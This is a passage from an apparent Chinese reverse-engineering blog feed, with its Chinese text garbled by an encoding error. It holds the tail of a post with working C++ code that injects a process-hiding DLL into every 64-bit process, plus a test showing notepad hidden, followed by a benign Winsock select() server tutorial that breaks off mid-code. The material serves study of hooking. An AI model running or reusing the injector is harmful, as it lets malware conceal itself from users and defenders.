(hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetModuleHandle failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetProcAddress failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateRemoteThread failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;DLL injected successfully into process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectAllProcesses</span><span class="params">(LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateToolhelp32Snapshot failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe)) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (pe.th32ProcessID &lt;= <span class="number">100</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Is64BitProcess</span>(pe.th32ProcessID)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping 32-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pe.szExeFile, <span class="string">L&quot;StartMenuExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;ShellExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;LockApp.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Attempting to inject into 64-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>(pe.th32ProcessID, szDllPath)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Successfully injected into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Failed to inject into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Process32First failed\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="comment">//if (argc != 2) &#123;</span></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;USAGE: %s dll_path\n&quot;), argv[0]);</span></span><br><span class="line"><span class="comment">//return 1;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">TCHAR dllpath[] = <span class="string">L&quot;xxx\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">injectAllProcesses</span>(dllpath);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯64ä½ï¼Œä¸èƒ½ç”¨taskmgræµ‹è¯•QAQï¼Œæ‰€ä»¥å†™äº†ä¸€ä¸ªæµ‹è¯•ç¨‹åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// è·å– ZwQuerySystemInformation å‡½æ•°åœ°å€</span></span><br><span class="line"><span class="comment">//setProcName(L&quot;notepad.exe&quot;);</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(</span><br><span class="line"><span class="built_in">getProc</span>(<span class="string">&quot;Ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (pZwQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to get ZwQuerySystemInformation address!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hookByCode(&quot;Ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, reinterpret_cast&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[0]);</span></span><br><span class="line"><span class="comment">// å®šä¹‰ç¼“å†²åŒºå¤§å°</span></span><br><span class="line">ULONG bufferSize = <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// åˆå§‹ç¼“å†²åŒºå¤§å°ï¼ˆ1MBï¼‰</span></span><br><span class="line">PVOID buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨ ZwQuerySystemInformation</span></span><br><span class="line">NTSTATUS status;</span><br><span class="line"><span class="keyword">while</span> ((status = <span class="built_in">pZwQuerySystemInformation</span>(</span><br><span class="line"><span class="number">5</span>, <span class="comment">// SystemProcessInformation</span></span><br><span class="line">buffer,</span><br><span class="line">bufferSize,</span><br><span class="line">&amp;bufferSize</span><br><span class="line">)) == STATUS_INFO_LENGTH_MISMATCH) &#123;</span><br><span class="line"><span class="comment">// å¦‚æœç¼“å†²åŒºä¸å¤Ÿå¤§ï¼Œé‡æ–°åˆ†é…æ›´å¤§çš„ç¼“å†²åŒº</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line">bufferSize *= <span class="number">2</span>;</span><br><span class="line">buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ZwQuerySystemInformation failed with status: &quot;</span> &lt;&lt; status &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†è¿›ç¨‹ä¿¡æ¯</span></span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(buffer);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// è¾“å‡ºè¿›ç¨‹IDå’Œè¿›ç¨‹å</span></span><br><span class="line">std::wcout &lt;&lt; <span class="string">&quot;Process ID: &quot;</span> &lt;&lt; <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(pProcessInfo-&gt;UniqueProcessId)</span><br><span class="line">&lt;&lt; <span class="string">&quot;, Process Name: &quot;</span> &lt;&lt; (pProcessInfo-&gt;ImageName.Buffer ? pProcessInfo-&gt;ImageName.Buffer : <span class="string">L&quot;Unknown&quot;</span>)</span><br><span class="line">&lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="line"><span class="keyword">if</span> (pProcessInfo-&gt;NextEntryOffset == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(</span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(pProcessInfo) + pProcessInfo-&gt;NextEntryOffset</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡Šæ”¾ç¼“å†²åŒº</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•ï¼Œnotepadå¯ä»¥éšè—</p>]]></content>
    
    
    <summary type="html">æœ¬ç¯‡è¯´æ˜è¿›ç¨‹éšè—çš„å·¥ä½œåŸç†</summary>
    
    
    
    <category term="é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="æŠ€èƒ½" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="Hook" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/Hook/"/>
    
    
    <category term="win" scheme="https://www.pri87.vip/tags/win/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘è·¯ç¼–ç¨‹2-SELECT</title>
    <link href="https://www.pri87.vip/posts/574e749a.html"/>
    <id>https://www.pri87.vip/posts/574e749a.html</id>
    <published>2025-02-23T13:01:42.000Z</published>
    <updated>2025-02-27T04:18:18.939Z</updated>
    
    <content type="html"><![CDATA[<h2 id="select">select</h2><p>selectç»´æŠ¤äº†ä¸€ä¸ªç›‘æµ‹é˜Ÿåˆ—ï¼Œå½“æˆ‘ä»¬æŠŠéœ€è¦çš„æ–‡ä»¶æè¿°ç¬¦ä¼ å…¥æ—¶ï¼Œå®ƒå°±ä¼šä¸»åŠ¨ç›‘æµ‹å…¶ä¸­çš„å†…å®¹ã€‚</p><p>ä¸€èˆ¬æ ¼å¼ä¸º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fd_set fdRead;<span class="comment">//ç›‘æµ‹é˜Ÿåˆ—</span></span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);<span class="comment">//sockåŠ å…¥ç›‘æµ‹é˜Ÿåˆ—</span></span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);<span class="comment">//selectResè¡¨æ˜selectæ˜¯å¦ç›‘æµ‹åˆ°sockçš„æ´»åŠ¨</span></span><br></pre></td></tr></table></figure><p>ç”±äºæœåŠ¡å™¨socketæ´»åŠ¨æ—¶è¡¨æ˜æœ‰æ–°è¿æ¥<br>å®¢æˆ·ç«¯socketæ´»åŠ¨æ—¶è¡¨æ˜æœ‰æ•°æ®å‘é€ï¼Œ<br>æ‰€ä»¥é€šè¿‡è¿™ä¸ªåŒºåˆ«æ¥æ·»åŠ æ–°å®¢æˆ·ç«¯å’Œå‘é€ä¿¡æ¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;  <span class="comment">// æ— é™å¾ªç¯ï¼ŒæŒç»­å¤„ç†äº‹ä»¶</span></span><br><span class="line">        <span class="comment">// 1. åˆå§‹åŒ– fd_setï¼Œæ·»åŠ æœåŠ¡ç«¯å¥—æ¥å­—å’Œæ‰€æœ‰å®¢æˆ·ç«¯å¥—æ¥å­—</span></span><br><span class="line">        fd_set fdRead;</span><br><span class="line">        <span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line">        <span class="built_in">FD_SET</span>(servSock, &amp;fdRead);  <span class="comment">// ç›‘æ§æœåŠ¡ç«¯å¥—æ¥å­—ï¼ˆæ–°è¿æ¥ï¼‰</span></span><br><span class="line">        <span class="keyword">for</span> (SOCKET client : clientList) &#123;</span><br><span class="line">            <span class="built_in">FD_SET</span>(client, &amp;fdRead);  <span class="comment">// ç›‘æ§æ‰€æœ‰å®¢æˆ·ç«¯å¥—æ¥å­—ï¼ˆæ•°æ®åˆ°è¾¾ï¼‰</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. è°ƒç”¨ selectï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º 1 ç§’</span></span><br><span class="line">        timeval tv&#123; <span class="number">1</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. å¤„ç† select ç»“æœ</span></span><br><span class="line">        <span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>) &#123;  <span class="comment">// æœ‰å¥—æ¥å­—æ´»åŠ¨</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i) &#123;  <span class="comment">// éå†æ´»è·ƒçš„å¥—æ¥å­—</span></span><br><span class="line">                SOCKET activeSock = fdRead.fd_array[i];</span><br><span class="line">                <span class="keyword">if</span> (activeSock == servSock) &#123;  <span class="comment">// æœåŠ¡ç«¯å¥—æ¥å­—æ´»è·ƒï¼šæ–°è¿æ¥</span></span><br><span class="line">                    SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clntSock == INVALID_SOCKET) &#123;</span><br><span class="line">                        std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    clientList.<span class="built_in">push_back</span>(clntSock);  <span class="comment">// å°†æ–°å®¢æˆ·ç«¯åŠ å…¥åˆ—è¡¨</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  <span class="comment">// å®¢æˆ·ç«¯å¥—æ¥å­—æ´»è·ƒï¼šæ•°æ®åˆ°è¾¾</span></span><br><span class="line">                    <span class="built_in">recvMsg</span>(fdRead, activeSock);  <span class="comment">// æ¥æ”¶å¹¶å¤„ç†æ•°æ®</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>) &#123;  <span class="comment">// è¶…æ—¶ï¼Œæ— æ´»åŠ¨</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// select é”™è¯¯</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æœåŠ¡ç«¯å®Œæ•´ä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Server</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">SOCKET servSock;</span><br><span class="line">std::list&lt;SOCKET&gt; clientList;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">coreFunc</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Server</span>() :<span class="built_in">servSock</span>(INVALID_SOCKET) &#123;&#125;;</span><br><span class="line">~<span class="built_in">Server</span>();</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span>;</span><br><span class="line"><span class="comment">//bool conductMsg();</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;server.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">Server::~<span class="built_in">Server</span>()</span><br><span 